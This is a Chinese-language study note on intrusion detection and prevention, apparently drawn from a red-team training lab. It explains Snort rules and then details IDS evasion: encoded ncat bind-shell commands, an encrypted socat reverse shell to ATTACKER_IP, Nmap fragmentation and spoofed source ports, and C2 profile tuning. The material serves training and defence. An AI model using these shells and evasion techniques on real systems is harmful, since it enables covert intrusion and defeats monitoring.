#### 概述

入侵检测系统 (IDS) 是一种旨在检测网络或系统入侵行为的系统。一个形象的比喻是，一名警卫通过监控多个安全摄像头的实时画面来发现潜在的盗窃行为。该警卫本身可能无法直接阻止盗窃，但如果他能通知其他警卫采取行动，那么检测就升级为了预防。入侵检测与预防系统 (IDPS)，或简称入侵预防系统 (IPS)，则是集检测与预防能力于一身的系统。

理解**检测 (Detection)** 与 **预防 (Prevention)** 之间的核心差异至关重要。以 Snort 为例，它既是网络入侵检测系统，也是网络入侵预防系统。因此，Snort 可以配置为 IDS 模式或 IPS 模式。若要使 Snort 作为 IPS 运行，它必须具备阻止 (drop) 恶意连接的机制。这通常要求 Snort 以 **内联模式 (inline)**部署，并连接到两个或更多的网络接口卡 (NICs)。

IDS 的部署位置可以将其分为两类：

1. **基于主机的 IDS (Host-based IDS - HIDS)**:
    - **部署**: 安装在目标操作系统上，与其他应用程序并行运行。
    - **能力**: 监控进出该主机的特定流量，并能监控主机上运行的进程活动。
2. **基于网络的 IDS (Network-based IDS - NIDS)**:
    - **部署**: 作为专用硬件设备或服务器，用于监控整个网络流量。
    - **能力**: 通常连接到交换机的**监控端口 (SPAN/Mirror Port)**，使其能够捕获并分析指定网络段或 VLAN 的所有流量，以识别恶意活动。

---

#### IDS 引擎类型 (IDS Engine Types)

网络流量与主机活动均可被大致归类为：

1. **良性流量/活动 (Benign Traffic/Activity)**: 正常、预期的行为，不应触发 IDS/IPS 警报。
2. **恶意流量/活动 (Malicious Traffic/Activity)**: 异常、不应出现的不良行为，期望 IDS/IPS 能够检测并告警。

IDS 的检测引擎构建逻辑主要围绕两个方向：要么精确识别恶意行为的特征，要么深入理解正常行为的基线。

因此，IDS 的检测引擎主要分为：

1. **基于特征的检测 (Signature-based Detection)**:
    - **原理**: 需要对恶意（或不期望的）流量/活动有明确、详尽的了解。通过预定义的、显式的规则（即“特征库”）来匹配和识别恶意行为。
    - **类比**: 类似于反病毒软件，依赖病毒特征数据库。任何匹配已知特征的流量都会被标记。
    - **缺点**: 无法检测未知的、无特征的攻击（0-day 攻击）；特征库需要持续更新。
2. **基于异常的检测 (Anomaly-based Detection)**:
    - **原理**: 首先学习并建立一个“正常”流量/活动的基线模型。任何偏离此基线的行为都可能被视为异常，并可能被标记为恶意。
    - **学习方式**: 可以通过机器学习自动建立基线，或通过手动配置规则来定义正常行为。
    - **类比**: 当你习惯了浏览器的正常响应速度后，如果它突然变得卡顿或无响应，你会意识到“出问题了”，因为其行为偏离了你所知的“正常”状态。
    - **缺点**: 误报率可能较高（将合法的异常行为误判为恶意）；“正常”基线的建立和维护可能很复杂。

---

#### IDS/IPS 规则触发 (IDS/IPS Rule Triggering - Snort 示例)

每个 IDS/IPS 系统都有其特定的规则编写语法。以 Snort 为例，其规则格式通常为：`Rule Header (Rule Options)`。

- **规则头部 (Rule Header)** 构成：
    
    1. **动作 (Action)**: 如 `alert` (告警), `log` (记录), `pass` (放行), `drop` (丢弃连接, IPS 功能), `reject` (拒绝连接并回复, IPS 功能)。
    2. **协议 (Protocol)**: 如 `tcp`, `udp`, `icmp`, `ip`。
    3. **源 IP/源端口 (Source IP/Port)**: 例如，`!10.10.0.0/16 any` 指的是所有不属于 `10.10.0.0/16` 子网的任何源端口。
    4. **流向 (Direction)**: `->` 表示从左 (源) 到右 (目标)，`<>` 表示双向流量。
    5. **目标 IP/目标端口 (Destination IP/Port)**: 例如，`10.10.0.0/16 any` 指的是 `10.10.0.0/16` 子网内的任何目标端口。
- 示例规则 1: 丢弃所有 ICMP 流量 (Drop all ICMP traffic via Snort IPS)
    
    Snort
    
    代码段
    
    ```
    drop icmp any any -> any any (msg:"ICMP Ping Scan"; dsize:0; sid:1000020; rev:1;)
    ```
    
    该规则指示 Snort IPS 丢弃任何源 IP/端口到任何目标 IP/端口的 ICMP 数据包，并记录消息 "ICMP Ping Scan"。
    
- 示例规则 2: 检测 HTTP POST 请求中利用 ncat 的行为
    
    假设一个 Web 服务器漏洞允许通过 HTTP POST 请求执行系统命令。我们希望检测流量载荷中是否包含 ncat 字符串。
    
    - 简单内容匹配 (ASCII):
        
        Snort
        
        代码段
        
        ```
        alert tcp any any <> any 80 (msg:"Netcat Exploitation"; content:"ncat"; sid:1000030; rev:1;)
        ```
        
        此规则检查与端口 80 交换的数据包内容中是否包含字符串 "ncat"。
        
    - 内容匹配 (十六进制): ncat 的 ASCII 对应的十六进制是 6e 63 61 74。
        
        Snort
        
        代码段
        
        ```
        alert tcp any any <> any 80 (msg:"Netcat Exploitation"; content:"|6e 63 61 74|"; sid:1000031; rev:1;)
        ```
        
    - 针对 HTTP POST 请求的优化匹配:
        
        Snort
        
        代码段
        
        ```
        alert tcp any any <> any 80 (msg:"Netcat Exploitation"; flow:established,to_server; content:"POST"; nocase; http_method; content:"ncat"; nocase; sid:1000032; rev:1;)
        ```
        
        此规则更为精确，`flow:established,to_server` 要求检查已建立连接且流向服务器的流量，`content:"POST"; http_method;` 确认是 POST 方法，然后才查找 `content:"ncat"`。`nocase` 表示不区分大小写。
        
- **日志示例 (ASCII 日志格式)**:
    
    ```
    [**] [1:1000031:1] Netcat Exploitation [**]
    [Priority: 0] 
    01/14-12:51:26.717401 10.14.17.226:45480 -> 10.10.112.168:80
    TCP TTL:63 TOS:0x0 ID:34278 IpLen:20 DgmLen:541 DF
    ***AP*** Seq: 0x26B5C2F Ack: 0x0 Win: 0x0 TcpLen: 32
    
    [**] [1:1000031:1] Netcat Exploitation [**]
    [Priority: 0] 
    01/14-12:51:26.717401 10.14.17.226:45480 -> 10.10.112.168:80
    TCP TTL:63 TOS:0x0 ID:34278 IpLen:20 DgmLen:541 DF
    ***AP*** Seq: 0x26B5C2F Ack: 0xF1090882 Win: 0x3F TcpLen: 32
    TCP Options (3) => NOP NOP TS: 2244530364 287085341
    ```
    

**重要提示**: 基于特征的 IDS/IPS 的检测能力高度依赖于其签名（规则）的编写质量和更新频率。如果攻击者对载荷进行微小修改（例如，不直接使用明文 `ncat`），就可能绕过简单规则的检测。

---

#### 规避 IDS/IPS 的通用方法 (General Methods for Evading IDS/IPS)

绕过基于特征的 IDS/IPS 的核心思想是操纵流量，使其不与任何已知签名匹配。攻击者可以从以下四个主要方向考虑规避策略：

1. **通过协议操作进行规避 (Evasion via Protocol Manipulation)**
2. **通过有效载荷操作实现规避 (Evasion via Payload Manipulation)**
3. **通过路由操纵进行规避 (Evasion via Route Manipulation)**
4. **通过战术拒绝服务 (DoS) 进行规避 (Evasion via Tactical Denial of Service)**

---

#### 1. 通过协议操作进行规避 (Evasion via Protocol Manipulation)

##### 1.1. 依赖不同协议 (Relying on Different Protocols)

- **原理**: IDS/IPS 可能针对特定协议配置了严格的检测规则，而对其他协议则相对宽松。攻击者可以尝试利用允许或监控较少的协议来传输恶意流量或窃取数据。
- **策略**:
    - 使用 UDP 代替 TCP。
    - 利用 HTTP/HTTPS 隧道承载其他协议的流量（例如 DNS over HTTPS）。
    - 根据目标环境允许的应用程序（如允许访问 Google 服务）来选择 C2 通道。
- **示例**:
    - 如果目标 IPS 严格限制外部 DNS 查询 (UDP/53) 和明文 HTTP (TCP/80)，但对 HTTPS (TCP/443) 较为宽松，则通过 HTTPS 隧道传输数据是一种可行的规避手段。
    - 使用 Ncat 时，默认使用 TCP。通过添加 `-u` 选项可以切换到 UDP。
        - TCP 监听: `ncat -lvnp PORT_NUM`
        - TCP 连接: `ncat TARGET_IP PORT_NUM`
        - UDP 监听: `ncat -ulvnp PORT_NUM`
        - UDP 连接: `ncat -u TARGET_IP PORT_NUM`
    - 将 Ncat 监听在常见服务端口以混淆视听（需 IDS/IPS 无深度包检测或配置不当）：
        - `ncat -lvnp 25` (伪装成 SMTP TCP 服务)
        - `ncat -ulvnp 162` (伪装成 SNMP UDP 服务)

##### 1.2. 操控 (源) TCP/UDP 端口 (Manipulating (Source) TCP/UDP Ports)

- **原理**: 许多基础安全方案在没有深度包检测 (DPI) 的情况下，会依赖端口号来初步判断流量的服务类型。攻击者可以通过修改其工具使用的源端口，使其流量看起来像是来自合法的、常见的服务端口。
- **工具与选项**:
    - **Nmap**: 使用 `-g PORT_NUMBER` 或 `--source-port PORT_NUMBER` 选项指定源端口。
        - TCP SYN 扫描，源端口 80 (伪装 HTTP): `nmap -sS -Pn -g 80 -F TARGET_IP`
        - UDP 扫描，源端口 53 (伪装 DNS): `nmap -sU -Pn -g 53 -F TARGET_IP`
    - **Ncat**: 监听在标准端口。
        - 攻击者监听 UDP 53 (伪装 DNS 服务器): `ncat -ulvnp 53`
        - 目标连接: `ncat -u ATTACKER_IP 53`
        - 攻击者监听 TCP 80 (伪装 Web 服务器): `ncat -lvnp 80`
        - 目标连接: `ncat ATTACKER_IP 80`

##### 1.3. 使用会话拼接 (IP 数据包分片) (Using Session Splicing - IP Packet Fragmentation)

- **原理**: 将攻击载荷分散到多个小的 IP 数据包（分片）中。如果 IDS/IPS 没有正确地重组所有分片并进行分析，那么包含恶意特征的完整字节流可能不会在单个数据包中出现，从而可能绕过基于签名的检测。
- **工具与选项**:
    - **Nmap**:
        - `-f`: 将数据分片为 8 字节的 IP 片段。
        - `-ff`: 将数据分片为 16 字节的 IP 片段。
        - `--mtu SIZE`: 自定义分片大小 (必须是 8 的倍数)。
    - **Fragroute**: 更专业的流量分片工具。
        - 创建配置文件 (例如 `fragroute.conf`) 包含规则如 `ip_frag 16` (数据分片不超过 16 字节)。
        - 运行命令: `fragroute -f fragroute.conf HOST_IP`

##### 1.4. 发送无效数据包 (Sending Invalid Packets)

- **原理**: 操作系统和 IDS/IPS 对无效数据包的处理方式可能不同。IDS/IPS 可能尝试处理一个它认为是畸形的数据包，而目标系统可能直接丢弃它，或者反之。这种不一致性可能被利用。
- **工具与选项 (Nmap)**:
    - `--badsum`: 发送带有错误 TCP/UDP 校验和的数据包。
    - `--scanflags <FLAGS>`: 发送带有自定义 TCP 标志的数据包，包括无效的标志组合。
        - 可用标志: `URG`, `ACK`, `PSH`, `RST`, `SYN`, `FIN`。
        - 示例 (设置 SYN, RST, FIN): `nmap --scanflags SYNRSTFIN TARGET_IP` (此特定组合可能无实际用途，仅为示例)。
- **工具与选项 (hping3)**: 用于构建具有自定义字段（有效或无效）的数据包。
    - `-t` or `--ttl`: 设置 IP TTL。
    - `-b` or `--badsum`: 发送错误 UDP/TCP 校验和。
    - `-S, -A, -P, -U, -F, -R`: 分别设置 TCP SYN, ACK, PSH, URG, FIN, RST 标志。

---

#### 2. 通过操作有效荷载进行规避 (Evasion via Payload Manipulation)

##### 2.1. 混淆和编码有效荷载 (Obfuscating and Encoding Payloads)

- **原理**: IDS 规则通常匹配特定的字符串或字节序列。对攻击载荷进行编码或混淆，改变其原始形态，可以避免触发这些精确的签名，前提是目标应用程序仍能正确解码并执行该载荷。
- **常见转换方法**:
    - **Base64 编码**:
        - 命令: `ncat -lvnp 1234 -e /bin/bash`
        - Linux `base64` 工具: `echo "ncat -lvnp 1234 -e /bin/bash" | base64`
        - 结果: `bmNhdCAtbHZucCAxMjM0IC1lIC9iaW4vYmFzaAo=` (注意末尾可能有换行符影响)
    - **URL 编码**: 将特殊字符转换为 `%HH` 格式。
        - 命令: `ncat -lvnp 1234 -e /bin/bash`
        - Linux `urlencode` 工具 (需安装) 或在线工具。
        - 结果: `ncat%20-lvnp%201234%20-e%20%2Fbin%2Fbash`
    - **Unicode 转义序列**:
        - 例如，使用 `\uXXXX` 格式。
        - 命令: `ncat -lvnp 1234 -e /bin/bash`
        - 结果 (示例): `\u006e\u0063\u0061\u0074\u0020\u002d\u006c\u0076\u006e\u0070\u0020\u0031\u0032\u0033\u0034\u0020\u002d\u0065\u0020\u002f\u0062\u0069\u006e\u002f\u0062\u0061\u0073\u0068`
        - 工具: CyberChef (`Escape Unicode Characters` recipe).

##### 2.2. 加密通信信道 (Encrypting Communication Channels)

- **原理**: IDS/IPS 通常无法检查加密数据的内容。如果攻击者能建立端到端的加密通道，其内部传输的恶意命令和数据对 IDS/IPS 来说将是不可见的。
    
- **工具与步骤 (使用 `socat` 和 `openssl` 实现加密反向 Shell)**:
    
    1. **创建密钥和证书**: Bash
        
        Bash
        
        ```
        # 在攻击者机器上执行
        openssl req -x509 -newkey rsa:4096 -days 365 -subj '/CN=www.redteam.thm/O=Red Team THM/C=UK' -nodes -keyout thm-reverse.key -out thm-reverse.crt
        cat thm-reverse.key thm-reverse.crt > thm-reverse.pem
        ```
        
        - `req`: 证书签名请求。
        - `-x509`: X.509 证书。
        - `-newkey rsa:4096`: 新 RSA 4096 位密钥。
        - `-days 365`: 证书有效期。
        - `-subj`: 证书主题信息。
        - `-nodes`: 不加密私钥。
        - `-keyout`: 私钥文件名。
        - `-out`: 证书文件名。
        - `thm-reverse.pem`: 合并后的 PEM 文件，包含私钥和证书。
    2. **在攻击者机器上监听 (使用 `socat`)**: Bash
        
        Bash
        
        ```
        socat -d -d OPENSSL-LISTEN:4443,cert=thm-reverse.pem,verify=0,fork STDOUT
        ```
        
        - `-d -d`: 调试信息。
        - `OPENSSL-LISTEN:4443`: 在 4443 端口使用 OpenSSL 加密监听。
        - `cert=thm-reverse.pem`: 指定 PEM 文件。
        - `verify=0`: 禁止检查对等方证书 (客户端不需要证书)。
        - `fork`: 为每个连接创建子进程。
        - `STDOUT`: 将子进程的输出重定向到监听器的标准输出。
    3. **在受害者机器上连接 (使用 `socat`)**: Bash
        
        Bash
        
        ```
        socat OPENSSL:ATTACKER_IP:4443,verify=0 EXEC:/bin/bash
        ```
        
        - `OPENSSL:ATTACKER_IP:4443`: 连接到攻击者的 OpenSSL 监听器。
        - `verify=0`: 不验证服务器证书的有效性 (对于自签名证书是必要的)。
        - `EXEC:/bin/bash`: 将 `/bin/bash` 进程的输入输出连接到 `socat`。
- **演示**:
    
    - 攻击者执行完步骤 1 和 2。
    - 受害者执行步骤 3，连接到攻击者。
    - 攻击者在其 `socat` 监听器上获得一个加密的 Shell。执行如 `cat /etc/passwd` 等命令，其内容在传输过程中是加密的，IDS/IPS 无法解析。

##### 2.3. 修改数据/Shellcode (Modifying Data/Shellcode)

- **原理**: 即使不使用复杂的编码或加密，对命令或 shellcode 进行微小的、功能等效的修改，也可能足以绕过不够健壮的 IDS 签名。
- **示例**:
    - 原始命令: `ncat -lvnp 1234 -e /bin/bash`
    - 规避扫描 `ncat -lvnp`:
        - 改变参数顺序: `ncat -nvlp 1234 -e /bin/bash` (许多程序允许参数顺序不同)
    - 规避扫描 `ncat -`:
        - 添加额外空格: `ncat -lvnp 1234 -e /bin/bash` (某些 shell 或解析器会忽略多余空格)
    - 替换工具: 使用 `nc`, `socat` 或其他功能类似的工具代替 `ncat`。
    - 对于 shellcode: 使用不同的编码器，添加 NOP (No Operation) 指令，改变指令顺序（如果逻辑允许），或使用多态/变形引擎生成不同的 shellcode 实例。

---

#### 3. 通过路由操纵进行规避 (Evasion via Route Manipulation)

##### 3.1. 依赖源路由 (Relying on Source Routing)

- **原理**: 源路由允许数据包的发送者指定数据包在到达最终目的地之前应经过的中间路由器（跳）。如果 IDS/IPS 不在攻击者指定的路径上，或者其监控逻辑未考虑源路由，则可能被绕过。**(注意：现代网络中，出于安全原因，源路由通常被禁用或限制)**。
- **工具与选项 (Nmap)**:
    - `--ip-options "L IP1 IP2 ..."`: 松散源路由 (Loose Source Routing)。数据包必须经过指定的 IP 地址，但允许中间有其他跳。
        - 示例: `nmap --ip-options "L 10.10.10.50 10.10.50.250" TARGET_IP`
    - `--ip-options "S IP1 IP2 ..."`: 严格源路由 (Strict Source Routing)。数据包必须严格按照指定的 IP 地址序列进行路由，中间不允许有其他跳。
        - 示例: `nmap --ip-options "S 10.10.10.1 10.10.20.2 10.10.30.3" TARGET_IP`

##### 3.2. 使用代理服务器 (Using Proxy Servers)

- **原理**: 通过代理服务器转发攻击流量，可以隐藏攻击者的真实源 IP 地址。如果 IDS/IPS 规则基于源 IP 黑名单，或者其分析侧重于直接连接，代理可以提供一层匿名性。
- **工具与选项 (Nmap)**:
    - `--proxies <proto://host:port,...>`: 指定一个或多个代理服务器。
        - 支持的协议: `HTTP`, `SOCKS4`.
        - 当前通常不支持身份验证。
        - 示例: `nmap -sS --proxies HTTP://PROXY_HOST1:8080,SOCKS4://PROXY_HOST2:4153 TARGET_IP`
- **其他工具**: 许多网络工具（如 Web 浏览器、Burp Suite、Metasploit 等）也支持代理配置。

---

#### 4. 通过战术性拒绝服务 (DoS) 进行规避 (Evasion via Tactical Denial of Service)

- **原理**: 旨在通过消耗 IDS/IPS 或其依赖组件（如日志服务器）的资源，使其无法有效处理真正的攻击流量或记录关键事件。
- **策略**:
    1. **对 IDS/IPS 发起 DoS**:
        - 生成大量良性或略微变化的流量，使其处理能力过载，导致其丢弃数据包（包括恶意数据包）或处理延迟。
    2. **对日志服务器发起 DoS**:
        - 生成大量会触发低优先级日志事件的非恶意流量。这可能导致日志系统存储空间耗尽、写入性能瓶颈，或使合法攻击日志被淹没在大量无关日志中，难以被发现。
    3. **操作员疲劳 (Operator Fatigue)**:
        - 通过产生大量误报（false positives），使安全分析人员对警报变得不敏感，从而可能忽略真正的攻击警报。

---

#### C2 与 IDS/IPS 规避 (C2 and IDS/IPS Evasion)

现代渗透测试框架（如 Cobalt Strike, Empire）通常提供高度可定制的命令与控制 (C2) 配置文件 (Malleable C2 Profiles)，允许攻击者微调其 C2 流量特征以更好地规避检测。

- **可配置的关键参数示例**:
    - **用户代理 (User-Agent)**: 修改 C2 流量的 HTTP User-Agent 字符串，使其看起来像合法的浏览器或应用程序流量，避免使用工具的默认 User-Agent。
    - **休眠时间 (Sleep Time / Callback Interval)**: 控制受感染主机（信标 Beacon）回连到 C2 服务器的频率。较长的、不规则的休眠时间可以降低被检测的概率。
    - **抖动 (Jitter)**: 在休眠时间上引入随机百分比的波动（例如，30% 的抖动意味着休眠时间会在设定值的基础上随机增减最多 30%），使回连模式更难预测。
    - **SSL 证书 (SSL Certificate)**: 使用自定义的、看起来合法的（甚至是购买的）SSL 证书进行 C2 通信加密，而不是使用自签名或工具默认证书，可以显著提高可信度。
    - **DNS Beaconing 配置**: 如果使用 DNS 作为 C2 通道，可以精细调整 DNS 查询的类型（A, AAAA, TXT等）、主机名构造方式（数据如何编码在主机名中）以及使用的 DNS 服务器。

**核心思想**: 避免使用默认配置，尽可能使 C2 流量融入目标环境的正常网络流量中。